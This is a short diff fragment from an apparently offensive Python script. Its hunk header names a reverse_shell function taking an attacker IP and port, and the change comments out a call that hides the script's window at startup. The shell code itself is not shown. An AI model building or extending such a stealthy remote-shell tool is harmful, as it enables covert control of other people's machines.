@@ -80,7 +80,7 @@ def reverse_shell(attacker_ip, attacker_port):
 
 # Main function
 if __name__ == "__main__":
-    hide_window()  # Hide the window when the script starts
+    #hide_window()  # Hide the window when the script starts
 
     # Install any missing dependencies
     install_dependencies()
